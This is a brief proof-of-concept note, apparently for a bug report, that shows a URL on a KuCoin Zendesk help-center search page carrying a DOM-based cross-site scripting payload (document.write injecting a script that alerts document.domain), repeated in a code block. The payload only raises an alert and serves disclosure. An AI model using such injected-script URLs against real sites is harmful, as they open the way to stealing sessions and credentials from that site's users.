https://kucoin.zendesk.com/hc/en-us/search?utf8=%E2%9C%93&query=document.write(%27...%20%3Cscript%3Ealert(document.domain)%3C/script%3E%20...%27);



DOM XSS POC CHECK CONSOLE FOR PROOF


```php-template
document.write('... <script>alert(document.domain)</script> ...');
```